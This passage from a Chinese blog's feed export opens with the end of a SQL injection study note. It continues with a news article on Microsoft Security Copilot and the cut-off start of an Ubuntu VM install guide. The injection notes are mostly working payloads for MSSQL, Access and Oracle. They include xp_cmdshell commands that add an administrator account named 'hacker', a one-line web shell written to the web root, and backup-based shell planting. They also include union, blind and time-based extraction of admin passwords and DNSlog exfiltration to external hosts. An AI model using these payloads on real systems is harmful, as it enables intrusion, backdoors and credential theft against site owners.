“whoami”</p><p>asp?id&#x3D;3;exec master.dbo.xp_cmdshell ‘net user hacker 123456 &#x2F;add’</p><p>XP_CMDSHELL 把用户 hacker 加到 ADMIN 组：</p><p>asp?id&#x3D;3;exec master.dbo.xp_cmdshell ‘net localgroup administrators hacker &#x2F;add’</p><p>学习的文档：<a href="https://www.lagou.com/lgeduarticle/38721.html">https://www.lagou.com/lgeduarticle/38721.html</a></p><p><a href="https://www.cnblogs.com/vigarbuaa/p/3371500.html">https://www.cnblogs.com/vigarbuaa/p/3371500.html</a></p><p><a href="https://www.cnblogs.com/cnjava/archive/2012/06/13/2547524.html">https://www.cnblogs.com/cnjava/archive/2012/06/13/2547524.html</a></p><p><a href="https://blog.csdn.net/weixin/_34319999/article/details/92479895">https://blog.csdn.net/weixin\_34319999/article/details/92479895</a></p><h2 id="拿-shell-方法"><a href="#拿-shell-方法" class="headerlink" title="拿 shell 方法"></a>拿 shell 方法</h2><p>前提：</p><p>1 具备 sa 或者 dbo 权限</p><p>2web 目录的绝对路径 （可以利用 xp_cmdshell 的方式寻找绝对路径，插个眼）</p><h3 id="1-xp-cmdshell-拿-shell"><a href="#1-xp-cmdshell-拿-shell" class="headerlink" title="(1)xp_cmdshell 拿 shell"></a>(1)xp_cmdshell 拿 shell</h3><p>1.aspx?id&#x3D;1;exec master..xp_cmdshell ‘echo ^&lt;%@ Page Language&#x3D;”Jscript”%^&gt;^&lt;%eval(Request.Item[“pass”],”unsafe”);%^&gt; &gt; c:\WWW\aufeng.aspx’ ;</p><h3 id="2-差异备份拿-shell"><a href="#2-差异备份拿-shell" class="headerlink" title="(2) 差异备份拿 shell"></a>(2) 差异备份拿 shell</h3><p>大概思路：</p><p>假设：<a href="http://xxxxx/show.aspx?code=1">http://xxxxx/show.aspx?code=1</a></p><p>中的 code 参数存在注入点 并且获得数据库名字为 abc 爆出了物理路径为 e:\xampp\htdocs\dvwa\</p><p>(1) 修改数据库设置为恢复模式</p><p><a href="http://xxxxx/show.asp?code=1%27;alter">http://xxxxx/show.asp?code=1&#39;;alter</a> database abc set RECOVERY FULL –</p><p>完全恢复模式是默认的恢复模式。在完全恢复模式下，需要手工的对事务日志进行管理，优点是可以恢复到数据库失败或者指定的时间点上。</p><p>(2) 备份当前数据库日志到文件</p><p><a href="http://xxxxx/show.aspx?code=1%27;backup">http://xxxxx/show.aspx?code=1&#39;;backup</a> log abc to disk&#x3D;‘e:\xampp\htdocs\dvwa’ with init –</p><p>备份数据库日志到服务器上，其中路径是网页的物理路径。</p><p>(3) 建立一张表和一个字段</p><p><a href="http://xxxxx/show.aspx?code=1%27;create">http://xxxxx/show.aspx?code=1&#39;;create</a> table tt(a text) –</p><p>(4) 往表中插入一句话马子</p><p><a href="http://xxxxx/show.asp?code=1%27;insert">http://xxxxx/show.asp?code=1&#39;;insert</a> into tt(a) values(’&lt;%eval request(“abc”) %&gt;’) –</p><p>values 中的内容一般转换为马子的 hex 值。</p><p>(5) 再次备份日志</p><p><a href="http://xxxxx/show.asp?code=1%27;backup">http://xxxxx/show.asp?code=1&#39;;backup</a> log ahykd_new to disk&#x3D;‘e:\xampp\htdocs\dvwa\1.aspx’ –</p><p>再次备份日志，备份路径为网站服务器的物理路径</p><p>(6) 删除表</p><p><a href="http://xxxxx/show.aspx?code=1%27;drop">http://xxxxx/show.aspx?code=1&#39;;drop</a> table tt –</p><p>然后菜刀尝试连接 <a href="http://xxxxx/1.aspx">http://xxxxx/1.aspx</a></p><p>参考文章：这里是借鉴大佬的笔记的总结</p><p><a href="https://www.yuque.com/aufeng/aufeng/_good/iganif#Q5PqT">https://www.yuque.com/aufeng/aufeng\_good/iganif#Q5PqT</a></p><p><a href="https://www.cnblogs.com/vigarbuaa/p/3371500.html">https://www.cnblogs.com/vigarbuaa/p/3371500.html</a></p><p>Access 数据库没有记录所有表名和列名的表，也就意味着我们需要依靠字典进行猜解表名和列</p><p>Access 数据库中没有注释符号. 因此 &#x2F;**&#x2F; 、 – 和 # 都没法使用。</p><p>sqlmap 语句：python sqlmap.py -u “<a href="http://test.com/1.asp?id=1">http://test.com/1.asp?id=1</a>“ –tables</p><h3 id="普通注入-2"><a href="#普通注入-2" class="headerlink" title="普通注入"></a>普通注入</h3><p>判断注入点</p><p>在参数后面加 单引号</p><p><a href="http://www.example.com/new/_list.asp?id=1">http://www.example.com/new\_list.asp?id=1</a>‘ #页面报错</p><p><a href="http://www.example.com/new/_list.asp?id=1">http://www.example.com/new\_list.asp?id=1</a> and 1&#x3D;1 #页面正常</p><p><a href="http://www.example.com/new/_list.asp?id=1">http://www.example.com/new\_list.asp?id=1</a> and 1&#x3D;2 #页面报错</p><p>猜字段： 1 order by 4 报错 1 order by 3 正确</p><h3 id="有回显："><a href="#有回显：" class="headerlink" title="有回显："></a>有回显：</h3><p>?id&#x3D;-1 union select 1,2,3,4,5,6,7,8,9,10 from admin（此时页面有显示 2、3）</p><p>查列：and exists (select 列名 from 表名) （假设存在 user、password）</p><p>?id&#x3D;3 and exists (select * from test)</p><p>?id&#x3D;3 and exists (select * from admin)</p><p>?id&#x3D;3 and exists (select name from admin) 报错，说明不存在</p><p>?id&#x3D;3 and exists (select username from admin) 说明存在 username</p><p>?id&#x3D;3 and exists (select password from admin) 说明存在 password</p><p>?id&#x3D;-1 union select 1,2,3,4,5,6,7,8,9,10 找到注入位</p><p>?id&#x3D;-1 union select 1,user,password,4,5,6,7,8,9,10 from admin（即可爆出账号密码）</p><h3 id="无回显："><a href="#无回显：" class="headerlink" title="无回显："></a>无回显：</h3><p>查表：and exists (select * from 表名) 存在的话就返回正常 不存在就返回不正常</p><p>查列：and exists (select 列名 from 表名)</p><p>查内容：and (select top 1 asc(mid(user,1,1))from admin)&#x3D;97</p><p>and (select top 1 asc(mid(user,2,1))from admin)&#x3D;97 猜字段 (username) 中第一条记录内容的第二个字符</p><p>and (select top 2 asc(mid(user,1,1))from admin)&#x3D;97 猜字段 (username) 中第二条记录内容的第一个字符</p><h3 id="偏移注入（回显数连续）"><a href="#偏移注入（回显数连续）" class="headerlink" title="偏移注入（回显数连续）"></a>偏移注入（回显数连续）</h3><p>假设已经判断存在 admin 表，order by 下判断有 35 行，且回显如下回显字段连续</p><p><img src="https://image.3001.net/images/20220714/1657765814_62cf7fb6ed96ca3d6341d.png!small"></p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,* from admin – 返回错误页面</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,* from admin – 返回错误页面</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,* from admin – 返回错误页面</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,* from admin – 返回到一个错误页面提示查询语句出错，因此 admin 表的列数为 6</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin</p><p>因为回显如下图 28 29 30 是连着的，直接在 27 后加表名.*</p><p><img src="https://image.3001.net/images/20220714/1657765836_62cf7fcc12b6e7da878c0.png!small"></p><p>爆出内容  </p><p><img src="https://image.3001.net/images/20220714/1657765847_62cf7fd738ed7ab7c3339.png!small"></p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin where id &#x3D; 3 添加 where id &#x3D; 数值，可得到更多的内容</p><h3 id="偏移注入（常规操作）"><a href="#偏移注入（常规操作）" class="headerlink" title="偏移注入（常规操作）"></a>偏移注入（常规操作）</h3><p>Access 偏移注入：表名知道，列名无法获取的情况下。</p><p>存在注入点，且 order by 下判断出字段数为 22 行</p><p><strong>爆出显位</strong></p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</p><p>***** <strong>号判断直到页面错误有变化</strong></p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin 正确</p><p>说明 admin 有 6 个字段</p><p><strong>Access**** 偏移注入</strong>，基本公式为：</p><p>order by 出的字段数减去 * 号的字段数，然而再用 order by 的字段数减去 2 倍刚才得出来的答案；</p><p>也就是：</p><p>* &#x3D; 6 个字符</p><p>2 × * &#x3D; 12 个字符</p><p>22 - 12 &#x3D; 10 个字符</p><p>一级偏移语句：</p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id &#x3D; b.id)</p><p>二级偏移语句：</p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id &#x3D; b.id)inner join admin as c on a.id&#x3D;c.id)</p><p>实战常见的表和列（也可以用 sqlmap 的，但是量大且效率低）</p><p>常见的表有（最后根据企业名的缩写搭配上 admin、user、name）</p><p>admin admins admin_user admin_usr admin_msg admin_login user username manager msg_user msg_login useradmin product、news、usr、system、article、customer、area</p><p>admin_id、admin_name、admin_password</p><p>常见的列</p><p>admin admin_user username password passwd pass pwd users usr user_login user_name login_name name 等等</p><p>oracle 注入 (jsp)</p><p><img src="https://image.3001.net/images/20220714/1657765866_62cf7fea9f4e6948d11dd.png!small"></p><h2 id="常规有回显注入"><a href="#常规有回显注入" class="headerlink" title="常规有回显注入"></a>常规有回显注入</h2><p>order by 3–</p><p>and 1&#x3D;2 union select null,null,null from dual–</p><p>and 1&#x3D;2 union select ‘null’,null,null from dual– &#x2F;&#x2F; 返回正常，则第一个字段是数字型，返回错误，为字符型</p><p>and 1&#x3D;2 union select 1,’2’,’3’ from dual– &#x2F;&#x2F; 判断显示位</p><p>and 1&#x3D;2 union select null,(select banner from sys.v_$version where rownum&#x3D;1),null from dual– &#x2F;&#x2F; 探测数据库版本信息</p><p>and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1),null from dual– &#x2F;&#x2F; 查询第一个表名</p><p>and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1 and table_name&lt;&gt;’STUDENT’),null from dual– &#x2F;&#x2F; 第二个表名</p><p>获取关键表中的列名：</p><p>‘union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and rownum&#x3D;1),null from dual –</p><p>‘union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’and column_name&lt;&gt;’SUSER’ and rownum&#x3D;1),null from dual –</p><p>‘union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’and column_name&lt;&gt;’SUSER’and column_name&lt;&gt;’SPWD’ and rownum&#x3D;1),null from dual –</p><p>‘union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’and column_name&lt;&gt;’SUSER’and column_name&lt;&gt;’SPWD’and column_name&lt;&gt;’SNAME’ and rownum&#x3D;1),null from dual –</p><p>and 1&#x3D;2 union select SNAME,SUSER,SPWD from T_USER where id&#x3D;1– &#x2F;&#x2F; 查看数据</p><h3 id="第二种常规注入"><a href="#第二种常规注入" class="headerlink" title="第二种常规注入"></a>第二种常规注入</h3><p>确定回显位，假设当前共 2 个字段，全是数字型，判断方式如下：<br>and 1&#x3D;2 union select 1,2 from dual　　假设回显位是 2，爆当前数据库中的第一个表：<br>and 1&#x3D;2 union select 1,(select table_name from user_tables where rownum&#x3D;1) from dual　　爆当前数据库中的第二个表：<br>and 1&#x3D;2 union select 1,(select table_name from user_tables where rownum&#x3D;1 and table_name not in (‘第一个表’)) from dual　　以此类推去爆第 n 个表<br>爆某表中的第一个字段：<br>and 1&#x3D;2 union select 1,(select column_name from user_tab_columns where rownum&#x3D;1 and table_name&#x3D;’表名（大写的）’) from dual　　爆某表中的第二个字段：<br>and 1&#x3D;2 union select 1,(select column_name from user_tab_columns where rownum&#x3D;1 and table_name&#x3D;’表名’ and column_name not in (‘第一个字段’)) from dual　　爆其它字段以此类推<br>爆某表中的第一行数据：<br>and 1&#x3D;2 union select 1, 字段 1|| 字段 2…|| 字段 n from 表名 where rownum&#x3D;1 – 连接多个字段用到的连接符号是 ||, 在 oracle 数据库中，concat 函数只能连接两个字符串</p><h3 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h3><p>利用 utl_inaddr.get_host_name<br>这种方法在 Oracle 8g，9g，10g 中不需要任何权限，但是在 Oracle 11g 以及以后的版本中，当前数据库用户必须有网络访问权限。</p><p>jsp?name&#x3D;’ and 1&#x3D;utl_inaddr.get_host_name((select user from dual)) –</p><p>ctxsys.drithsx.sn()</p><p>jsp?name&#x3D;’ and 1&#x3D;ctxsys.drithsx.sn(1,(select user from dual)) –</p><p>dbms_xdb_version.checkin()</p><p>jsp?name&#x3D;1’ and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null—</p><p>dbms_utility.sqlid_to_sqlhash()</p><p>jsp?name&#x3D;1’ and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null –</p><p>XMLType()</p><p>sname&#x3D;1′ and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null –</p><h3 id="布尔注入-1"><a href="#布尔注入-1" class="headerlink" title="布尔注入"></a>布尔注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsp?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,1,0) from dual) </span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20220714/1657765888_62cf80001865e22a5f8e0.png!small"></p><p>username&#x3D;admin’and (select substr(user, 1, 1) from dual)&#x3D;’S’ –</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>主要用 DBMS_PIPE.RECEIVE_MESSAGE</p><p>即 user 的第一位是 “A” 时，延时 5 秒执行。</p><p>And 1&#x3D;(select decode(substr(user,1,1),’A’,DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) ,0) from dual)</p><p>第二位是 D 时，延时 5 秒</p><p>And 1&#x3D;(select decode(substr(user,2,1),’D’,DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) ,0) from dual)</p><p>news.jsp?id&#x3D;1 and 1&#x3D;(select decode(substr(user,1,1),’S’,dbms_pipe.receive_message(‘RDS’,5),0) from dual) –</p><h3 id="DNSlog-注入"><a href="#DNSlog-注入" class="headerlink" title="DNSlog 注入"></a>DNSlog 注入</h3><p>utl_inaddr.get_host_address</p><p>select utl_inaddr.get_host_address((select user from dual)||’.cbb1ya.dnslog.cn’) from dual</p><p>SYS.DBMS_LDAP.INIT 这个函数在 10g&#x2F;11g 中是 public 权限.</p><p>SELECT DBMS_LDAP.INIT((select user from dual)||’.24wypw.dnslog.cn’,80) FROM DUAL;</p><p>借鉴大佬博客：<a href="https://www.yuque.com/aufeng/aufeng/_good/iganif#zoa46">https://www.yuque.com/aufeng/aufeng\_good/iganif#zoa46</a></p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h2 id="Sqlite-注入"><a href="#Sqlite-注入" class="headerlink" title="Sqlite 注入"></a>Sqlite 注入</h2><p>如果您的站点允许用户通过网页输入，并将输入内容插入到 SQLite 数据库中，这个时候您就面临着一个被称为 SQL 注入的安全问题。本章节将向您讲解如何防止这种情况的发生，确保脚本和 SQLite 语句的安全。</p><p>1.Sqlite-master: 这个是内置系统表、相当于 mysql 的 information_schema</p><p>但是这里只存有表的信息，里面有个 sql 字段，有各个表的结构，有表名，字段名和类型</p><p>2.sqlite 并不支持像 mysql 那样的注释，但是可以通过 — 方式增加 DDL 注释 (写 shell 会用到)</p><p>可参考：<a href="https://blog.csdn.net/hackzkaq/article/details/117119953">https://blog.csdn.net/hackzkaq/article/details/117119953</a></p><h2 id="Postsql-注入"><a href="#Postsql-注入" class="headerlink" title="Postsql 注入"></a>Postsql 注入</h2><p>PostgreSQL 是一种特性非常齐全的自由软件的对象 - 关系型数据库管理系统（ORDBMS），4.2 版本为基础的对象关系型数据库管理系统。</p><p>PostgreSQL 安装后，默认的端口是：5432，默认的用户名是： postgres ，默认的数据库也是：postgres 。</p><ul><li><p>注释符：–</p></li><li><p>延时函数：pg_sleep(3)</p></li></ul><p><img src="https://image.3001.net/images/20220714/1657765907_62cf8013ada166b4cf32d.png!small"></p><p>可参考谢公子的文章：<a href="https://blog.csdn.net/qq/_36119192/article/details/104628797">https://blog.csdn.net/qq\_36119192/article/details/104628797</a></p><h2 id="Oracle-注入"><a href="#Oracle-注入" class="headerlink" title="Oracle 注入"></a>Oracle 注入</h2><p><code>基础知识</code><br>Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用 dual，dual 是 Oracle 的虚拟表，用来构成 select 的语法规则，Oracle 保证 dual 里面永远只有一条记录。</p><p>Oracle 的数据类型是强匹配的 (MYSQL 有弱匹配的味道)，所以在 Oracle 进行类似 UNION 查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用 null 代替某些无法快速猜测出数据类型的位置。</p><p>参考文档学习：<a href="https://blog.csdn.net/weixin/_42508548/article/details/121516504">https://blog.csdn.net/weixin\_42508548/article/details/121516504</a></p><p>总结: 本文主要是对 Owasp-top10–sql 注入的学习整理，参考了一些大佬的文章，还尚有不足，需要多加学习，望大佬们多多支持。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Security Copilot 分析</title>
      <link href="/2023/04/21/%E5%AE%89%E5%85%A8/Security%20Copilot%20%E5%88%86%E6%9E%90/"/>
      <url>/2023/04/21/%E5%AE%89%E5%85%A8/Security%20Copilot%20%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><blockquote><p>尽管形态上很像聊天机器人，但微软将 Security Copilot 的功能限制在与安全相关的查询上，用户不能询问其他问题。</p></blockquote><p>近日，微软在其首届 “Microsoft Secure” 大会上推出了一款定位于网络安全领域的新工具“Security Copilot”，专门用于对情报威胁进行检测和解析。</p><p>相比此前几次重磅活动的大张旗鼓，微软此次并不太显山露水，其官网也是低调上线了一则帖子介绍 Security Copilot 的应用和功能，宣称可 “帮助防御者以机器的速度和规模进行端到端防御”。</p><p>在微软官方演示的小视频中，Security Copilot 很像一个聊天机器人，支持外部和内部安全数据的查询，以及文件查询、事件分析。</p><p><img src="https://img.36krcdn.com/hsossms/20230330/v2_570f6825d5d64d73857168043673eaec_oswg280399oswg700oswg396_img_000"></p><p>如果用户提问 “我的企业里有哪些安全事件？”，Security Copilot 就会做出总结。</p><p>Security Copilot 主要由 OpenAI 的 ChatGPT-4 驱动，还特别整合了一个微软的安全专用模型，这个模型纳入了一套不断增长的安全专业技能，并每天持续学习微软在其威胁情报中收集的超过 65 万亿个信号数据，为 Security Copilot 幕后的安全专业人员提供追捕支持。</p><p>Security Copilot 拥有一个极其简洁的界面，能够接受自然语言输入，用户只需向其发送提示——可以是问题和请求，也可以是提交的文件、URL、代码片段或威胁指标——Security Copilot 会动用安全模型的全部功能来分析事件或执行任务。</p><p>所有的提示和回应都会被保存，这对微软的安全调查人员来说相当于一个完整的审计跟踪过程。</p><p>根据微软的演示，用户甚至可以使用 Security Copilot 来创建一个 PowerPoint 幻灯片，对威胁事件和攻击载体进行概括总结。</p><p><img src="https://img.36krcdn.com/hsossms/20230330/v2_b00eaf11a87a40e6bfb1f62412a06be0_oswg604802oswg700oswg640_img_000"></p><p>目前已有很多网络安全工具可以做到 Security Copilot 的部分能力，但微软认为，<strong>Security Copilot 能与它现有的安全产品组合相整合</strong>，并通过 OpenAI 的人工智能大模型比如 GPT-4，进化得更好。这具体是指 Security Copilot 可以与微软的三大王牌安全产品 Microsoft Sentinel、Microsoft Defender、Microsoft Intune 进行集成，提供事件安全、应用程序防护、云端到本地等多维度防护。</p><p>不过，微软没有透露 Security Copilot 如何接入 GPT-4 的任何细节。</p><p>微软方面表示，Security Copilot 的设计目的是辅助而不是取代安全分析师的工作。</p><p>总结下来，其主要功能中有四大亮点：</p><p>一是<strong>简化安全流程复杂性</strong>：用户借助 Security Copilot 可实现 “分钟级” 自动网络安全事件<strong>评估和响应</strong>，而不是传统的几小时甚至几天。Security Copilot 通过基于自然语言的调查，提供关键的分步指导，可以汇总所有安全、调查事件，简化安全流程，让用户直观地看到最重要的安全信息，并对其做出安全防护对策。</p><p><img src="https://img.36krcdn.com/hsossms/20230330/v2_2e185218b1a347f4b7383316c2549691_oswg333399oswg700oswg601_img_000"></p><p>图源：微软产品演示：用自然语言让 Security Copilot 分析安全事件并给出可行动的事件响应建议</p><p>第二，<strong>深度分析、优先级排序</strong>：Security Copilot 发现安全问题后，会深度分析攻击行为，并能预测黑客下一步的行动以及抵御方法；它能通过<strong>关联和总结攻击数据</strong>，帮助安全团队抓住别人错过的东西，对<strong>事件进行优先排序</strong>，并<strong>推荐最佳行动方案</strong>，迅速及时地补救各种威胁，还能修复常见的错误安全配置，与微软的其他安全产品一起配合，自动阻断一些常见的安全攻击。</p><p>第三，<strong>回答专业的网络安全知识</strong>：例如，介绍攻击病毒的历史，为制定防护计划提供帮助。</p><p><img src="https://img.36krcdn.com/hsossms/20230330/v2_a18786dd1f4d48e29b71a3fc542141a1_oswg577119oswg700oswg617_img_000"></p><p>第四，<strong>自我学习</strong>：用户的每一次反馈都将加速 Security Copilot 对安全事件响应、网络攻击的分析效率和准确率。</p><p>微软安全部门副总裁 Vasu Jakkal 指出，在今天，网络安全专业人员面临的困难仍然很多，经常与复杂的攻击方进行不对等的战斗，“通过 Security Copilot，我们正在将力量的平衡转移到自己这边。”</p><p>这位在微软负责企业安全、合规、身份和隐私的副总裁描述了这款产品的站位，“Secur<br>ity Copilot 是第一个，也是唯一一个生成式人工智能安全产品，能帮助安全防御者以人工智能的速度和规模行动。”</p><p>微软副总裁兼人工智能安全架构师 Chang Kawaguchi 则强调，Security Copilot 与它所整合的任何安全产品一样，受到同等的数据共享限制和规定，必须遵守各项服务的隐私政策。</p><p>需要指出的是，微软将 Security Copilot 的功能限制在与安全相关的查询上，用户不能询问其他问题。微软承认，目前 Security Copilot 并不完美，定制模型并不能做到万无一失。“AI 生成的内容可能包含错误，” 微软在帖子上写道，“随着我们继续从这些互动中学习，我们正在调整它的反应，以创造更连贯、相关和有用的答案。”</p><p>目前这款产品正在测试阶段，处于私人预览版状态，正式的发布日期和价格尚未公布。</p><p>微软是在最新一轮裁员开启之后推出 Security Copilot 的。根据 Business Insider 的报道，微软计划本周一开始在 Charlie Bell 负责的安全组织内进行裁员，这次裁员将影响到美国的数百名员工。此前，Bell 的安全业务团队在微软第一波万人裁员中毫发无损。</p><p>结合此前微软 CEO 纳德拉曾表示万人裁员的截止日期是 3 月 31 日，安全业务应该是巨头裁员接近尾声时的最后选定目标。</p><p><strong>网络安全目前是人工智能领域最大的细分市场</strong>，也是微软最重要的投资领域之一。今年开年之后，微软垄断了基于 OpenAI 的几乎所有生产力工具，还在浏览器领域取得了巨大胜利，此番在网络安全市场可否梳理出增量空间，将更多取决于微软对安全业务的理解方式和内部重视程度。</p>]]></content>
      
      
      <categories>
          
          <category> Articles </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 虚拟机安装教程</title>
      <link href="/2023/04/21/%E5%AE%89%E5%85%A8/Ubuntu%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2023/04/21/%E5%AE%89%E5%85%A8/Ubuntu%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="VMware-虚拟机安装-Ubuntu20-04-详细图文教程"><a href="#VMware-虚拟机安装-Ubuntu20-04-详细图文教程" class="headerlink" title="VMware 虚拟机安装 Ubuntu20.04 详细图文教程"></a><a href="https://so.csdn.net/so/search?q=VMware&spm=1001.2101.3001.7020">VMware</a> 虚拟机安装 Ubuntu20.04 详细图文教程</h3><ul><li><a href="#1_VMUbuntu_2">1 VM 和 Ubuntu 下载</a></li><li><a href="#2_VMUbuntu_14">2 VM 安装 Ubuntu</a></li><li><a href="#3_Ubuntu_100">3 更改 Ubuntu 软件源</a></li><li><a href="#4_WindowsUbuntu_120">4 Windows 与 Ubuntu 跨系统复制粘贴</a></li></ul><h1 id="1-VM-和-Ubuntu-下载"><a href="#1-VM-和-Ubuntu-下载" class="headerlink" title="1 VM 和 Ubuntu 下载"></a>1 VM 和 <a href="https://so.csdn.net/so/search?q=Ubuntu&spm=1001.2101.3001.7020">Ubuntu</a> 下载</h1><p><strong>Ubuntu 系统下载官方链接：</strong><a href="https://ubuntu.com/download/desktop">Ubuntu 系统下载</a></p><p><img src="https://img-blog.csdnimg.cn/d9385558aa9547ae98d629b87eaf78fe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p><strong>VMware 下载官方链接:</strong> <a href="https://www.vmware.com/cn/products/workstation-player/workstation-player-evaluation.html">VMware Workstation 16 Player 下载</a></p><p><img src="https://img-blog.csdnimg.cn/65fad3f8d9d54627ba41cbe09eeac989.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p><strong>下完 VMware 直接安装就行了</strong></p><h1 id="2-VM-安装-Ubuntu"><a href="#2-VM-安装-Ubuntu" class="headerlink" title="2 VM 安装 Ubuntu"></a>2 VM 安装 Ubuntu</h1><p><strong>双击打开 VMware Workstation 16 Player</strong><br><img src="https://img-blog.csdnimg.cn/d49d73980c79436baea7d2c45f698f41.png#pic_center"><br><strong>点击创建新虚拟机</strong></p><p><img src="https://img-blog.csdnimg.cn/37819804c0d84f169ab7ed292939ce3e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>选择稍后安装操作系统，再点下一步</strong></p><p><img src="https://img-blog.csdnimg.cn/23c6117f952b402181baa5eade94ea7d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_15,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>然后注意这两个地方，选择操作系统和版本如下，再点下一步</strong></p><p><img src="https://img-blog.csdnimg.cn/1cbc351ce459415ca05268cd38f90cfc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_15,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>自己定一个系统存储位置，再下一步</strong></p><p><img src="https://img-blog.csdnimg.cn/201ff9f468624f66b807bb75abb4b953.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_15,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>最大磁盘大小按需修改，选择存储为单个文件，再下一步</strong></p><p><img src="https://img-blog.csdnimg.cn/65419237c75f472fbec543900e8ff436.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_15,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>点击自定义硬件</strong></p><p><img src="https://img-blog.csdnimg.cn/6f50b0ca80a8410d9523626c49094dee.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_15,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>选择使用 ISO 映像文件，浏览选中刚开始下载的 Ubuntu 系统，然后点右下角的关闭，再点完成</strong></p><p><img src="https://img-blog.csdnimg.cn/446703ba17454102a83bee6431e71482.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>选中，点击播放虚拟机</strong></p><p><img src="https://img-blog.csdnimg.cn/0794b00d38b040909f94b19dca4293f5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aW95YOP5b6I5aW95ZCD,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br><strong>然后等待…</strong></p><p><img 